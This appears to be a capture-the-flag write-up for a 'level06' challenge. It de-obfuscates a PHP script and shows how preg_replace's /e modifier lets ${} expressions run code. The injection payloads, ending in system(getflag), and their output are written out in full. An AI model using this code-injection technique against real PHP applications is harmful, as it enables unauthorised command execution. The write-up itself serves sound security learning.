## Phase 1: Reconnaissance

We start by listing the files in the current directory:


`ls -la`


This reveals two files:
- `level06`
- `level06.php`

The presence of a PHP file suggests something related to PHP this level

---

## Phase 2: Script Analysis

We inspect the PHP file:

```bash
cat level06.php
```

The code appears heavily obfuscated, so we use an online PHP prettifier to make it readable

### Prettified Code

```php
#!/usr/bin/php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}

function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}

$r = x($argv[1], $argv[2]);
print $r;
?>
```

From this code we identify two functions:

- **`y`**
  - Replaces every `.` with ` x `
  - Replaces every `@` with ` y`

- **`x`**
  - Reads the contents of a file using `file_get_contents`
  - Uses `preg_replace` with the `/e` modifier
  - Replaces `[` with `(` and `]` with `)`

---

## Phase 3: De-obfuscation

To better understand the logic, we rewrite the code using clearer function and variable names:

```php
#!/usr/bin/php
<?php
function transformText($text)
{
    $text = preg_replace("/\./", " x ", $text);
    $text = preg_replace("/@/", " y", $text);
    return $text;
}

function processFile($filePath, $unusedArg)
{
    $content = file_get_contents($filePath);
    $content = preg_replace("/(\[x (.*)\])/e", "transformText(\"\\2\")", $content);
    $content = preg_replace("/\[/", "(", $content);
    $content = preg_replace("/\]/", ")", $content);
    return $content;
}

$result = processFile($argv[1], $argv[2]);
print $result;
?>
```

Now it becomes clear that:
- The script reads a file provided as the first argument
- It processes patterns of the form `[x SOMETHING]`
- The `/e` modifier causes PHP to **evaluate the replacement as PHP code**

---

## Phase 4: Vulnerability Analysis

Researching PHP regular expressions reveals that the `/e` modifier is **dangerous** and deprecated

- We also find out PHP's `preg_replace /e modifier` is paranoid about quotes and it automatically runs `addslashes()` on the input, basically turning every `"` into `\"` in the final text, sanitizing any code injection attempt
- `/e` evaluates the replacement string as PHP code  
- However `${}` expressions are **not escaped** and are still evaluated  

This behavior allows arbitrary code execution

---

## Phase 5: Exploitation

We test this behavior with the following input:

```bash
echo '[x {${print(1337)}}]' > /tmp/exploit && ./level06 /tmp/exploit
```

Output:

```txt
1337
PHP Notice:  Undefined variable: 1 in /home/user/level06/level06.php(4) : regexp code on line 1
```

This error is everything we wanted
1. We can see 1337 at the beginning of the line, this means `print(1337)` ran and printed 1337
2.  The function `print(1337)` then exited and returned `1`
3.   So now to PHP the code looks like this: `${1}`  
  - We then get more errors like `PHP Notice: Undefined variable: 1` because PHP tries to look for this variable but it doesnt exist

This method works because when PHP sees `${...}` inside a string, it thinks: *"I need to know the name of this variable... but to find the name, I must execute the code inside the braces first"*

---

### Command Execution

We now test with a system command (basically run a shell command with php):

```bash
echo '[x {${system(whoami)}}]' > /tmp/exploit && ./level06 /tmp/exploit
```

Output:

```txt
flag06
```

This confirms that commands are executed with **flag06 privileges**

---

## Phase 6: Getting the Flag

Finally, we run `getflag` using the same technique:

```bash
echo '[x {${system(getflag)}}]' > /tmp/exploit && ./level06 /tmp/exploit
```

Output:

```txt
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```
